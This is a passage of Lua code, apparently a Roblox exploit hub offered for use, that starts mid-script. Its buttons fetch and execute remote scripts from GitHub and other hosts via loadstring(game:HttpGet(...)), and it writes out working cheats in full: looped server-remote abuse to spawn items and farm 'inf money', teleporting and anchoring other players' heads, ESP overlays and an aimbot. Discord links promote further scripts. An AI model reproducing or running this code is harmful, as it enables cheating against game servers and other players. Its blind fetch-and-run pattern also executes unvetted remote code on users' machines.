    Text = "Enabled!"; -- what the text says (ofc)
    Duration = 5;
})
 
local LuckyBlock = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local title = Instance.new("TextLabel")
local Frame_HUB = Instance.new("ImageLabel")
local HUB = Instance.new("TextLabel")
local Main = Instance.new("Frame")
local LuckyBlock_2 = Instance.new("TextButton")
local SuperBlock = Instance.new("TextButton")
local GalaxyBlock = Instance.new("TextButton")
local RainbowBlock = Instance.new("TextButton")
local DiamondBlock = Instance.new("TextButton")
local CopyDiscordServer = Instance.new("TextButton")
local DiscordServer_box = Instance.new("TextBox")
local lable_discord = Instance.new("TextLabel")
local open_box = Instance.new("TextBox")
local toBox = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local close = Instance.new("ImageButton")
 
--Properties:
 
LuckyBlock.Name = "LuckyBlock"
LuckyBlock.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
LuckyBlock.ResetOnSpawn = false
 
Frame.Name = "Frame"
Frame.Parent = LuckyBlock
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0.304542094, 0, 0.326781332, 0)
Frame.Size = UDim2.new(0, 525, 0, 300)
Frame.Image = "rbxassetid://3570695787"
Frame.ImageColor3 = Color3.fromRGB(0, 0, 0)
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120
Frame.Active = true
Frame.Draggable = true
 
title.Name = "title"
title.Parent = Frame
title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1.000
title.Size = UDim2.new(0, 439, 0, 51)
title.Font = Enum.Font.SourceSans
title.Text = "LuckyBlock"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 28.000
 
Frame_HUB.Name = "Frame_HUB"
Frame_HUB.Parent = Frame
Frame_HUB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_HUB.BackgroundTransparency = 1.000
Frame_HUB.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame_HUB.Position = UDim2.new(0.531428576, 0, 0.0277550742, 0)
Frame_HUB.Size = UDim2.new(0, 81, 0, 33)
Frame_HUB.Image = "rbxassetid://3570695787"
Frame_HUB.ImageColor3 = Color3.fromRGB(255, 170, 0)
Frame_HUB.ScaleType = Enum.ScaleType.Slice
Frame_HUB.SliceCenter = Rect.new(100, 100, 100, 100)
Frame_HUB.SliceScale = 0.120
 
HUB.Name = "HUB"
HUB.Parent = Frame_HUB
HUB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HUB.BackgroundTransparency = 1.000
HUB.Position = UDim2.new(0, 0, -0.00494801067, 0)
HUB.Size = UDim2.new(0, 81, 0, 33)
HUB.Font = Enum.Font.SourceSans
HUB.Text = "HUB"
HUB.TextColor3 = Color3.fromRGB(0, 0, 0)
HUB.TextScaled = true
HUB.TextSize = 14.000
HUB.TextWrapped = true
 
Main.Name = "Main"
Main.Parent = Frame
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderColor3 = Color3.fromRGB(255, 255, 255)
Main.Position = UDim2.new(-0.034285713, 0, 0.170000002, 0)
Main.Size = UDim2.new(0, 559, 0, 0)
 
LuckyBlock_2.Name = "LuckyBlock"
LuckyBlock_2.Parent = Frame
LuckyBlock_2.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
LuckyBlock_2.BorderSizePixel = 0
LuckyBlock_2.Position = UDim2.new(0.0552380905, 0, 0.223333329, 0)
LuckyBlock_2.Selectable = false
LuckyBlock_2.Size = UDim2.new(0, 150, 0, 35)
LuckyBlock_2.AutoButtonColor = false
LuckyBlock_2.Font = Enum.Font.SourceSans
LuckyBlock_2.Text = "LuckyBlock"
LuckyBlock_2.TextColor3 = Color3.fromRGB(255, 255, 255)
LuckyBlock_2.TextSize = 28.000
 
SuperBlock.Name = "SuperBlock"
SuperBlock.Parent = Frame
SuperBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
SuperBlock.BorderSizePixel = 0
SuperBlock.Position = UDim2.new(0.0552381277, 0, 0.383333325, 0)
SuperBlock.Selectable = false
SuperBlock.Size = UDim2.new(0, 150, 0, 35)
SuperBlock.AutoButtonColor = false
SuperBlock.Font = Enum.Font.SourceSans
SuperBlock.Text = "SuperBlock"
SuperBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
SuperBlock.TextSize = 28.000
 
GalaxyBlock.Name = "GalaxyBlock"
GalaxyBlock.Parent = Frame
GalaxyBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
GalaxyBlock.BorderSizePixel = 0
GalaxyBlock.Position = UDim2.new(0.0552381277, 0, 0.826666653, 0)
GalaxyBlock.Selectable = false
GalaxyBlock.Size = UDim2.new(0, 150, 0, 35)
GalaxyBlock.AutoButtonColor = false
GalaxyBlock.Font = Enum.Font.SourceSans
GalaxyBlock.Text = "GalaxyBlock"
GalaxyBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
GalaxyBlock.TextSize = 28.000
 
RainbowBlock.Name = "RainbowBlock"
RainbowBlock.Parent = Frame
RainbowBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
RainbowBlock.BorderSizePixel = 0
RainbowBlock.Position = UDim2.new(0.0552381277, 0, 0.679999948, 0)
RainbowBlock.Selectable = false
RainbowBlock.Size = UDim2.new(0, 150, 0, 35)
RainbowBlock.AutoButtonColor = false
RainbowBlock.Font = Enum.Font.SourceSans
RainbowBlock.Text = "RainbowBlock"
RainbowBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
RainbowBlock.TextSize = 28.000
 
DiamondBlock.Name = "DiamondBlock"
DiamondBlock.Parent = Frame
DiamondBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
DiamondBlock.BorderSizePixel = 0
DiamondBlock.Position = UDim2.new(0.0552381277, 0, 0.533333302, 0)
DiamondBlock.Selectable = false
DiamondBlock.Size = UDim2.new(0, 150, 0, 35)
DiamondBlock.AutoButtonColor = false
DiamondBlock.Font = Enum.Font.SourceSans
DiamondBlock.Text = "DiamondBlock"
DiamondBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
DiamondBlock.TextSize = 28.000
 
CopyDiscordServer.Name = "CopyDiscordServer"
CopyDiscordServer.Parent = Frame
CopyDiscordServer.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
CopyDiscordServer.BorderSizePixel = 0
CopyDiscordServer.Position = UDim2.new(0.531428576, 0, 0.826666713, 0)
CopyDiscordServer.Selectable = false
CopyDiscordServer.Size = UDim2.new(0, 194, 0, 35)
CopyDiscordServer.AutoButtonColor = false
CopyDiscordServer.Font = Enum.Font.SourceSans
CopyDiscordServer.Text = "CopyDiscordServer"
CopyDiscordServer.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyDiscordServer.TextSize = 28.000
 
DiscordServer_box.Name = "DiscordServer_box"
DiscordServer_box.Parent = Frame
DiscordServer_box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
DiscordServer_box.BorderSizePixel = 0
DiscordServer_box.Position = UDim2.new(0.531428576, 0, 0.709999979, 0)
DiscordServer_box.Size = UDim2.new(0, 194, 0, 35)
DiscordServer_box.ClearTextOnFocus = false
DiscordServer_box.Font = Enum.Font.SourceSans
DiscordServer_box.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
DiscordServer_box.PlaceholderText = "https://discord.gg/v7PDxkhqWt"
DiscordServer_box.Text = "https://discord.gg/v7PDxkhqWt"
DiscordServer_box.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordServer_box.TextSize = 14.000
 
lable_discord.Name = "lable_discord"
lable_discord.Parent = Frame
lable_discord.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
lable_discord.BackgroundTransparency = 1.000
lable_discord.Position = UDim2.new(0.531428576, 0, 0.533333361, 0)
lable_discord.Size = UDim2.new(0, 194, 0, 53)
lable_discord.Font = Enum.Font.SourceSans
lable_discord.Text = "--You will find many other scripts in this discord server."
lable_discord.TextColor3 = Color3.fromRGB(0, 170, 0)
lable_discord.TextScaled = true
lable_discord.TextSize = 28.000
lable_discord.TextWrapped = true
 
open_box.Name = "open_box"
open_box.Parent = Frame
open_box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
open_box.BorderSizePixel = 0
open_box.Position = UDim2.new(0.750476241, 0, 0.313333333, 0)
open_box.Size = UDim2.new(0, 56, 0, 35)
open_box.ClearTextOnFocus = false
open_box.Font = Enum.Font.SourceSans
open_box.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
open_box.PlaceholderText = "Value"
open_box.Text = "1"
open_box.TextColor3 = Color3.fromRGB(255, 255, 255)
open_box.TextSize = 28.000
open_box.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 
toBox.Name = "toBox"
toBox.Parent = Frame
toBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toBox.BackgroundTransparency = 1.000
toBox.Position = UDim2.new(0.531428635, 0, 0.286666691, 0)
toBox.Size = UDim2.new(0, 194, 0, 50)
toBox.Font = Enum.Font.SourceSans
toBox.Text = "0 to "
toBox.TextColor3 = Color3.fromRGB(255, 255, 255)
toBox.TextSize = 28.000
 
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.Position = UDim2.new(0.400000006, 0, 0.170000002, 0)
Frame_2.Size = UDim2.new(0, 0, 0, 292)
 
close.Name = "close"
close.Parent = Frame
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.90054822, 0, 0.00678133965, 0)
close.Size = UDim2.new(0, 45, 0, 45)
close.ZIndex = 2
close.Image = "rbxassetid://3926305904"
close.ImageRectOffset = Vector2.new(284, 4)
close.ImageRectSize = Vector2.new(24, 24)
 
 
----------------------------------------------------------------
 
close.MouseButton1Click:connect(function()
    Frame.Visible = false
end)
 
LuckyBlock_2.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
    end
end)
 
DiamondBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
    end
end)
 
SuperBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnSuperBlock:FireServer()
    end
end)
 
RainbowBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
    end
end)
 
GalaxyBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
    end
end)
 
CopyDiscordServer.MouseButton1Down:connect(function()
    setclipboard("https://discord.gg/TyUzMpMMUE")
    wait(1)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Success!";
        Text = "Copy Discord: https://discord.gg/v7PDxkhqWt"; -- what the text says (ofc)
        Duration = 5;
    })
end)
end)
 
Section:NewButton("Combat Warrios", "-", function()
wait()
--Fixed loading issue
--Also Fixed performance issue when executing
loadstring(game:HttpGet("https://raw.githubusercontent.com/frkfx/Combat-Warriors/main/Script"))()
end)

Section:NewButton("The Rake REMASTERED", "gui", function()
wait()
loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua')()
end)

Section:NewButton("Prison life", "admin to prison life", function()
wait()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
end)

Section:NewButton("scp 3008 gui", "gui", function()
wait()
loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua')()
end)

Section:NewButton("BIG Paintball (key)", "aim bot and more", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0xd5f/CERBERUS/main/CERBERUS.lua", true))()
end)

Section:NewButton("Inf Jumps, ESP, Tp Head", "Inf Jumps, ESP, Tp Head", function()
wait()
local SilentAssassinV1 = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Inf = Instance.new("TextButton")
local Border = Instance.new("TextLabel")
local Border_2 = Instance.new("TextLabel")
local Tp = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local Close = Instance.new("TextButton")
local Esp = Instance.new("TextButton")
local Open = Instance.new("TextButton")
 
SilentAssassinV1.Name = "SilentAssassinV1"
SilentAssassinV1.Parent = game.CoreGui
 
Main.Name = "Main"
Main.Parent = SilentAssassinV1
Main.Active = true
Main.Draggable = true
Main.BackgroundColor3 = Color3.new(1, 1, 1)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.439999998, 0, -0.379999995, 0)
Main.Size = UDim2.new(0, 313, 0, 226)
Main.Style = Enum.FrameStyle.RobloxRound
 
Inf.Name = "Inf"
Inf.Parent = Main
Inf.BackgroundColor3 = Color3.new(0.266667, 0.611765, 0.705882)
Inf.Position = UDim2.new(0.293356001, 0, 0.369042367, 0)
Inf.Size = UDim2.new(0, 121, 0, 30)
Inf.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
Inf.Font = Enum.Font.SciFi
Inf.Text = "Inf Jump"
Inf.TextColor3 = Color3.new(0.227451, 0.329412, 0.423529)
Inf.TextSize = 16
Inf.TextStrokeColor3 = Color3.new(0.227451, 0.329412, 0.423529)
 
Border.Name = "Border"
Border.Parent = Main
Border.BackgroundColor3 = Color3.new(0.376471, 0.698039, 1)
Border.BorderSizePixel = 0
Border.Position = UDim2.new(-0.0278844871, 0, 0.163740993, 0)
Border.Size = UDim2.new(0, 313, 0, 8)
Border.SizeConstraint = Enum.SizeConstraint.RelativeXX
Border.Font = Enum.Font.SourceSans
Border.Text = ""
Border.TextColor3 = Color3.new(0, 0, 0)
Border.TextSize = 14
 
Border_2.Name = "Border"
Border_2.Parent = Main
Border_2.BackgroundColor3 = Color3.new(0.376471, 0.698039, 1)
Border_2.BorderSizePixel = 0
Border_2.Position = UDim2.new(-0.0283860359, 0, -0.0413680971, 0)
Border_2.Size = UDim2.new(0, 313, 0, 8)
Border_2.SizeConstraint = Enum.SizeConstraint.RelativeXX
Border_2.Font = Enum.Font.SourceSans
Border_2.Text = ""
Border_2.TextColor3 = Color3.new(0, 0, 0)
Border_2.TextSize = 14
 
Tp.Name = "Tp"
Tp.Parent = Main
Tp.BackgroundColor3 = Color3.new(0.266667, 0.611765, 0.705882)
Tp.Position = UDim2.new(0.290669143, 0, 0.738794327, 0)
Tp.Size = UDim2.new(0, 121, 0, 30)
Tp.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
Tp.Font = Enum.Font.SciFi
Tp.Text = "Tp Players Head"
Tp.TextColor3 = Color3.new(0.227451, 0.329412, 0.423529)
Tp.TextSize = 16
Tp.TextStrokeColor3 = Color3.new(0.227451, 0.329412, 0.423529)
 
Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.161489859, 0, 0.0452267826, 0)
Title.Size = UDim2.new(0, 200, 0, 16)
Title.Font = Enum.Font.SciFi
Title.Text = "Silent Assassin V1"
Title.TextColor3 = Color3.new(0.819608, 0.819608, 0.819608)
Title.TextSize = 23
 
Close.Name = "Close"
Close.Parent = Main
Close.BackgroundColor3 = Color3.new(0.266667, 0.611765, 0.705882)
Close.BackgroundTransparency = 1
Close.BorderSizePixel = 0
Close.Position = UDim2.new(-0.0285393968, 0, 0.891390383, 0)
Close.Size = UDim2.new(0, 30, 0, 30)
Close.Font = Enum.Font.SciFi
Close.Text = "X"
Close.TextColor3 = Color3.new(0.74902, 0, 0)
Close.TextSize = 16
Close.TextStrokeColor3 = Color3.new(0.227451, 0.329412, 0.423529)
 
Esp.Name = "Esp"
Esp.Parent = Main
Esp.BackgroundColor3 = Color3.new(0.266667, 0.611765, 0.705882)
Esp.Position = UDim2.new(0.289959162, 0, 0.553506851, 0)
Esp.Size = UDim2.new(0, 121, 0, 30)
Esp.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
Esp.Font = Enum.Font.SciFi
Esp.Text = "Esp"
Esp.TextColor3 = Color3.new(0.227451, 0.329412, 0.423529)
Esp.TextSize = 16
Esp.TextStrokeColor3 = Color3.new(0.227451, 0.329412, 0.423529)
 
Open.Name = "Open"
Open.Parent = SilentAssassinV1
Open.BackgroundColor3 = Color3.new(1, 1, 1)
Open.Position = UDim2.new(0, 0, 0.761627853, 0)
Open.Size = UDim2.new(0, 174, 0, 43)
Open.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
Open.Font = Enum.Font.SciFi
Open.Text = "Open Main"
Open.TextColor3 = Color3.new(0.215686, 0.443137, 0.619608)
Open.TextSize = 28
 
--Making Script--
 
--Open Animation--
 
Open.MouseButton1Click:connect(function()
    Main:TweenPosition(UDim2.new(0.44, 0,0.38, 0), 'In', 'Bounce', 1, true)
    Open.Visible = false
end)
 
--Close Animation--
 
Close.MouseButton1Click:connect(function()
    Main:TweenPosition(UDim2.new(0.44, 0,-0.38, 0), 'Out', 'Bounce', 1, true)
    Open.Visible = true
end)
 
--Tp Head--
 
Tp.MouseButton1Click:connect(function()
for i,v in pairs(game.Players:GetChildren()) do
if v.Name ~= game.Players.LocalPlayer.Name then
v.Character.Head.Anchored = true
v.Character.Head.CFrame = game.Players.LocalPlayer.Character.Head.CFrame*CFrame.new(0,0,-5)
end
end
end)
 
--Inf Jumps--
 
Inf.MouseButton1Click:connect(function()
local plr = game:GetService"Players".LocalPlayer
game:GetService("UserInputService").JumpRequest:connect(function()
game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
end)
end)
 
--Esp--
 
Esp.MouseButton1Click:connect(function()
wait(0.5)
 
plrs = nil
for _,p in pairs(game:GetChildren()) do
   if p.ClassName == ("Players") then
   plrs = p
   end
end
 
 
while true do
wait(0.1)
for _, v in pairs(plrs:GetChildren()) do
if v.TeamColor ~= plrs.LocalPlayer.TeamColor and not v.Character.Head:FindFirstChild("BillboardGui") then --   ~=
i = Instance.new("BillboardGui",v.Character.Head)
i.Active = true
i.AlwaysOnTop = true
i.Size = UDim2.new(1,0,1,0)
h = Instance.new("Frame",i)
h.Size = UDim2.new(2,0,1,0)
h.AnchorPoint = Vector2.new(0.25, 0)
h.BackgroundColor3 = Color3.new(1,0,0)
h.BorderSizePixel = 0
h.BackgroundTransparency = 0.4
 
i2 = Instance.new("BillboardGui",v.Character.Torso)
i2.Active = true
i2.AlwaysOnTop = true
i2.Size = UDim2.new(2,0,2,0)
t = Instance.new("Frame",i2)
t.Size = UDim2.new(1,0,1,0)
t.AnchorPoint = Vector2.new(0, 0)
t.BackgroundColor3 = Color3.new(0,1,0)
t.BorderSizePixel = 0
t.BackgroundTransparency = 0.4
 
i3 = Instance.new("BillboardGui",v.Character["Left Arm"])
i3.Active = true
i3.AlwaysOnTop = true
i3.Size = UDim2.new(1,0,2,0)
la = Instance.new("Frame",i3)
la.Size = UDim2.new(1,0,1,0)
la.AnchorPoint = Vector2.new(0, 0)
la.BackgroundColor3 = Color3.new(0,0,1)
la.BorderSizePixel = 0
la.BackgroundTransparency = 0.4
 
i4 = Instance.new("BillboardGui",v.Character["Right Arm"])
i4.Active = true
i4.AlwaysOnTop = true
i4.Size = UDim2.new(1,0,2,0)
ra = Instance.new("Frame",i4)
ra.Size = UDim2.new(1,0,1,0)
ra.AnchorPoint = Vector2.new(0, 0)
ra.BackgroundColor3 = Color3.new(0,0,1)
ra.BorderSizePixel = 0
ra.BackgroundTransparency = 0.4
 
i5 = Instance.new("BillboardGui",v.Character["Left Leg"])
i5.Active = true
i5.AlwaysOnTop = true
i5.Size = UDim2.new(1,0,2,0)
ll = Instance.new("Frame",i5)
ll.Size = UDim2.new(1,0,1,0)
ll.AnchorPoint = Vector2.new(0, 0)
ll.BackgroundColor3 = Color3.new(0,0,1)
ll.BorderSizePixel = 0
ll.BackgroundTransparency = 0.4
 
i6 = Instance.new("BillboardGui",v.Character["Right Leg"])
i6.Active = true
i6.AlwaysOnTop = true
i6.Size = UDim2.new(1,0,2,0)
rl = Instance.new("Frame",i6)
rl.Size = UDim2.new(1,0,1,0)
rl.AnchorPoint = Vector2.new(0, 0)
rl.BackgroundColor3 = Color3.new(0,0,1)
rl.BorderSizePixel = 0
rl.BackgroundTransparency = 0.4
 
end
end
end
end)
 
--End Of The Script--
end)
 
Section:NewButton("DOORS (key)", "the key of the script in the discord", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectLightningDev/Project-Lightning-Loader/main/Loader.Lua"))()
end)

Section:NewButton("DA HOOD", "gui", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ImagineProUser/vortexdahood/main/vortex", true))()
end)

Section:NewButton("Zombie Attack", "gui", function()
wait()
loadstring(game:HttpGet"https://raw.githubusercontent.com/WinterDinder/zombiettackfixed/main/zombo")()
end)

Section:NewButton("Specter 2", "my favorite game)", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
end)

Section:NewButton("Apeirophobia (key)", "gui", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CopyReal/NexHub/main/NexHubLoader"))()
end)

Section:NewButton("Horrific Housing (inf money)", "-", function()
wait()
while true do
wait(0)
local Target = game:GetService("ReplicatedStorage").LoginRewards;
Target:FireServer();
end
end)
 
Section:NewButton("JailBreak", "Script to JailBreak", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Loader.lua"))()
end)
 
Section:NewButton("Build a boat for Treasure  (key)", "the key of the script in the discord", function()
wait()
loadstring(game:HttpGet('http://acehub.pro/api/whitelist'))()
end)
 
Section:NewButton("Breaking Point", "aim bot", function()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/tkorra/bp-gui/main/main.lua'))()
end)
 
Section:NewButton("MAD CITY", "HACK SCRIPT", function()
wait()
loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/811e25ec8cfcdaa9ae7026353288783c/raw/4b073a5c1a0a4e2ed7e2304c2e769eb440a371a9/h", true))()
end)

Section:NewButton("MAD CITY 2 (Recommended) (key)", "HACK SCRIPT2", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/castycheat/mad-city/main/Protected%20(25).lua"))()
end)

Section:NewButton("SharkBite 2 (key)", "the key of the script in the discord", function()
wait()
loadstring(game:HttpGet('https://factshub.vercel.app'))()
end)

Section:NewButton("The Strongest Battlegrounds", "-", function()
    wait()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sandwichk/RobloxScripts/main/Scripts/BadWare/Hub/Load.lua", true))()
    end)
 
Section:NewButton("Criminality", "by meetly", function()
    wait()
    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
 
    local Window = Library.CreateLib("Criminality", "RJTheme2")
     
    local Tab = Window:NewTab("Maim")
     
    local Section = Tab:NewSection("CRIMINALITY SCRIPT")
    
    Section:NewButton("AimBot", "AimBot/ESP", function()
        wait()
    -- Yes, I know This Is Shit.
    local PLAYER = game.Players.LocalPlayer
    local CurrentCam  = game.Workspace.CurrentCamera
    local UIS = game:GetService("UserInputService")-- Made By Mick Gordon
    local WorldToViewportPoint = CurrentCam.WorldToViewportPoint
    local mouseLocation = UIS.GetMouseLocation
    
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Made By Mick Gordon", Text = "Enjoy !"})
    
    local DeleteMob ={
        GUi = {
            OpenNCloseButton = true; -- Have A Button For It
            KeybindEnable = false; -- If You Want A Bind For The Menu
            Keybind = "z"; -- Menu Key Bind
        };
        Aimbot= {
            Keybind = "MouseButton2"; -- Change Aim Bot Key Bind Here !!! No Capitals, Unless it is MouseButton1 or MouseButton2
    ------------------------------------------------------------------------------------------
            Enabled = false; -- No Need To Change Anything Here As It Is On The GUI
            TeamCheck = false;
            WallCheck = false;
            ShowFov = false;
            Fov = 0;
            Smoothing = 0;
            AimPart = "Head";
            Thickness = 1;
            FovFillColor = Color3.fromRGB(100,0,100);
            FovColor = Color3.fromRGB(100,0,100);
            FovFillTransparency = 1;
            FovTransparenct = 0;
            IsAimKeyDown = false;
        };
        ESP ={
            Box = {
                Box = false;
                Name = false;
                Distance = false;
                Health = false;
    
                TeamCheck = false;
    
                HealthType = "Bar";
    
                BoxColor = Color3.fromRGB(75,0,10);
            };
            OutLines = {
                Enabled = false;
                TeamCheck = false;
                TeamColor = false;
    
                AllwaysShow = true;
    
                FillCollor = Color3.fromRGB(75,0,10);
                FillTrancparenct = 0;
    
                OutlineColor = Color3.fromRGB(0,0,0);
                OutlineTrancparency = 0;
            };
            Tracers = {
                Enabled = false;
                TeamCheck = false;
                TeamColor = false;
    
                Color = Color3.fromRGB(75,0,10);
            }
        }-- Made By Mick Gordon
    }
    
    -- Made By Mick Gordon
    local Fov = Instance.new("ScreenGui")Fov.Name = "Fov" Fov.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") Fov.ZIndexBehavior = Enum.ZIndexBehavior.Sibling Fov.ResetOnSpawn = false-- i miss you synapse fov
    local TracersG = Instance.new("ScreenGui")TracersG.Name = "Tracers" TracersG.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") TracersG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling TracersG.ResetOnSpawn = false
    local FOVFFrame = Instance.new("Frame")FOVFFrame.Parent = Fov FOVFFrame.Name = "FOVFFrame" FOVFFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) FOVFFrame.BorderColor3 = Color3.fromRGB(0, 0, 0) FOVFFrame.BorderSizePixel = 0 FOVFFrame.BackgroundTransparency = 1 FOVFFrame.AnchorPoint = Vector2.new(0.5, 0.5) FOVFFrame.Position = UDim2.new(0.5, 0,0.5, 0) FOVFFrame.Size = UDim2.new(0, DeleteMob.Aimbot.Fov, 0, DeleteMob.Aimbot.Fov) FOVFFrame.BackgroundTransparency = 1 
    local UICorner = Instance.new("UICorner")UICorner.CornerRadius = UDim.new(1, 0) UICorner.Parent = FOVFFrame -- Made By Mick Gordon
    local UIStroke = Instance.new("UIStroke")UIStroke.Color = Color3.fromRGB(100,0,100) UIStroke.Parent = FOVFFrame UIStroke.Thickness = 1 UIStroke.ApplyStrokeMode = "Border" game:GetService("StarterGui"):SetCore("SendNotification", {Title = "https://discord.gg/FsApQ7YNTq", Text = "The Discord For More!"})
    local BoxC = Instance.new("ScreenGui", game.Workspace) BoxC.Name = "Box"
    local Higlight = Instance.new("ScreenGui",game.Workspace)
    local connections = {}
    -- Made By Mick Gordon
    local function AddHighlight(plr)
        local Highlight = Instance.new("Highlight")
        Highlight.Parent = Higlight
        Highlight.Name = plr.Name
        Highlight.Enabled = DeleteMob.ESP.OutLines.Enabled
        local plrchar = plr.Character
        if plrchar then
            Highlight.Adornee = plrchar
        end
        connections[plr] = plr.CharacterAdded:Connect(function(char)
            Highlight.Adornee = char
        end)
        local co = coroutine.create(function()
            while wait(.1) do
                if plr ~= PLAYER and plr and plr.Character and plr.Character.FindFirstChild(plr.Character, "Humanoid") and plr.Character.Humanoid.Health > 0 then
    
                    if DeleteMob.ESP.OutLines.Enabled == true then
                        if DeleteMob.ESP.OutLines.TeamCheck == true and plr.TeamColor == PLAYER.TeamColor then
                            Highlight.Enabled = false
                        else
                            Highlight.Enabled = true
                        end
                    else-- Made By Mick Gordon
                        Highlight.Enabled = false
                    end
    
                    if DeleteMob.ESP.OutLines.TeamColor == true then
                        Highlight.FillColor = plr.TeamColor.Color 
                    else
                        Highlight.FillColor = DeleteMob.ESP.OutLines.FillCollor
                    end
    
                    if DeleteMob.ESP.OutLines.AllwaysShow == true then
                        Highlight.DepthMode = "AlwaysOnTop" 
                    else
                        Highlight.DepthMode = "Occluded" 
                    end-- Made By Mick Gordon
    
                    Highlight.OutlineTransparency = DeleteMob.ESP.OutLines.OutlineTrancparency
                    Highlight.OutlineColor = DeleteMob.ESP.OutLines.OutlineColor
                    Highlight.FillTransparency = DeleteMob.ESP.OutLines.FillTrancparenct
    
                    if not (game:GetService"Players":FindFirstChild(plr.Name)) then
                        Higlight:FindFirstChild(plr.Name):Destroy()
                        coroutine.yield()
                    end
                else
                    Highlight.Enabled = false
                end
            end
        end)
        coroutine.resume(co)
    end
    -- Made By Mick Gordon
    local function AddBox(player) -- Saves FPS 
        local bbg = Instance.new("BillboardGui", BoxC)
        bbg.Name = player.Name
        bbg.AlwaysOnTop = true
        bbg.Size = UDim2.new(4,0,5.4,0)
        bbg.ClipsDescendants = false
        bbg.Enabled = false
    
        local outlines = Instance.new("Frame", bbg)
        outlines.Size = UDim2.new(1,0,1,0)
        outlines.BorderSizePixel = 1
        outlines.BackgroundTransparency = 1
        local left = Instance.new("Frame", outlines)
        left.BorderSizePixel = 1
        left.Size = UDim2.new(0,(1),1,0)
        local right = left:Clone()
        right.Parent = outlines
        right.Size = UDim2.new(0,-(1),1,0)   
        right.Position = UDim2.new(1,0,0,0)
        local up = left:Clone()-- Made By Mick Gordon
        up.Parent = outlines
        up.Size = UDim2.new(1,0,0,(1))
        local down = left:Clone()
        down.Parent = outlines
        down.Size = UDim2.new(1,0,0,-(1))
        down.Position = UDim2.new(0,0,1,0)
    
